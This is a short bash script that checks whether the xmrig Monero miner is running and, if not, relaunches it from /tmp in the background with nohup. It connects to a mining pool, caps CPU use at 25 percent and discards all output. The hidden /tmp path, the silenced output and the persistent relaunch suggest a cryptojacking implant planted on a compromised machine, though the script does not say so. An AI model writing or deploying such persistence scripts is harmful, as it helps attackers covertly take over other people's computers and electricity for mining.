#!/bin/bash
pgrep -x xmrig >/dev/null
if [[ $? -ne 0 ]] ; then
        nohup /tmp/xmrig -o asia.randomx-hub.miningpoolhub.com:20580 -a rx/0 -k -u flaksdjf.worker --coin monero --cpu-max-threads-hint 25 > /dev/null 2>&1 &
fi 
